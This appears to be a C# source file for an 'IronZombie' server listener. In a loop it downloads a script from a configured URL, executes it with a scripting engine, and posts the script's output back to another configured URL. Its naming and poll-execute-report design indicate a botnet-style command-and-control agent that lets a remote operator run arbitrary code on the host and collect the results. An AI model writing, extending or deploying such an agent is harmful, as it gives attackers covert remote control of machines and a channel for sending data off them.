using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Configuration;
using System.Net;
using System.IO;
using Iron.Server;
using System.Threading;

namespace IronZombie.Server
{
    public class IronWebsiteListener : IIronListener
    {
        private readonly string __GETSCRIPTURL = ConfigurationManager.AppSettings["GETSCRIPTURL"].ToString();
        private readonly string __POSTSCRIPTURL = ConfigurationManager.AppSettings["POSTSCRIPTURL"].ToString();
        private readonly int __TIMESPANINSECONDS = int.Parse(ConfigurationManager.AppSettings["WAIT_TIMESPAN_SECONDS"].ToString());
        private bool run = true;


        //void IIronListener.Run()
        //{
        //    for (; ; )
        //    {
        //        //IZombieScriptHandler izs = new ZombieScriptHandler();
        //        IIronScript izScript =  this.GetScript();
        //        IIronScriptEngine izScriptHandler = new IronScriptEngine(izScript);
        //        izScript = izScriptHandler.ExecuteScript();
        //        //string scriptOutput = izs.ExecuteScript(ZombieScriptLanguage.IronPython, script);
        //        //izs.ReplyToScript(scriptOutput);
        //        //Console.WriteLine(izScript.ScriptOutput);
        //        int status = this.ReplyToScript(izScript);


        //        //IIronListener iil = new IronWebsiteListener();

        //        Thread.Sleep(TimeSpan.FromSeconds(this.__TIMESPANINSECONDS));
        //    }
        //}

        private IronScript GetScript()
        {
            string script = string.Empty;
            Uri uri = new Uri(this.__GETSCRIPTURL);
            if (uri.Scheme == Uri.UriSchemeHttp)
            {
                HttpWebRequest hwrRequestScript = (HttpWebRequest)HttpWebRequest.Create(uri);
                hwrRequestScript.Method = WebRequestMethods.Http.Get;
                HttpWebResponse hwrResponseScript = (HttpWebResponse)hwrRequestScript.GetResponse();
                StreamReader reader = new StreamReader(hwrResponseScript.GetResponseStream());
                script = reader.ReadToEnd();
                hwrResponseScript.Close();
            }

            return new IronScript() { Language = IronScriptLanguage.Unknown, Script = script, ScriptOutput = string.Empty };
            //IZombieScript izScript = new ZombieScript();
            //izScript.Language = ZombieScriptLanguage.Unknown;
            //izScript.Script = script;
            //return izScript;
        }

        private int ReplyToScript(Iron.Server.IIronScript izScript)
        {
            Uri uri = new Uri(this.__POSTSCRIPTURL);

            HttpWebRequest hwrRequestScript = (HttpWebRequest)HttpWebRequest.Create(uri);
            hwrRequestScript.Method = WebRequestMethods.Http.Post;

            string data = string.Format("re_txtscript={0}", izScript.ScriptOutput);
            byte[] dataArray = Encoding.UTF8.GetBytes(data);

            hwrRequestScript.ContentType = "application/x-www-form-urlencoded";
            hwrRequestScript.ContentLength = dataArray.Length;
            Stream dataStream = hwrRequestScript.GetRequestStream();
            dataStream.Write(dataArray, 0, dataArray.Length);
            dataStream.Close();


            HttpWebResponse response = (HttpWebResponse)hwrRequestScript.GetResponse();

            //if (HttpStatusCode.OK == response.StatusCode)
            //{
            //    dataStream = response.GetResponseStream();
            //    StreamReader reader = new StreamReader(dataStream);
            //    string responseFromServer = reader.ReadToEnd();
            //}

            if (HttpStatusCode.OK == response.StatusCode)
            {
                dataStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(dataStream);
                //izScript.ScriptOutput = reader.ReadToEnd();
                string responseString = reader.ReadToEnd();
            }
            return (int)response.StatusCode;
        }

        public void Start()
        {
            while (this.run)
            {
                //IZombieScriptHandler izs = new ZombieScriptHandler();
                IIronScript izScript = this.GetScript();
                IIronScriptEngine izScriptHandler = new IronScriptEngine(izScript);
                izScript = izScriptHandler.ExecuteScript();
                //string scriptOutput = izs.ExecuteScript(ZombieScriptLanguage.IronPython, script);
                //izs.ReplyToScript(scriptOutput);
                //Console.WriteLine(izScript.ScriptOutput);
                int status = this.ReplyToScript(izScript);


                //IIronListener iil = new IronWebsiteListener();

                Thread.Sleep(TimeSpan.FromSeconds(this.__TIMESPANINSECONDS));
            }
        }

        public void Stop()
        {
            this.run = false;
        }
    }
}
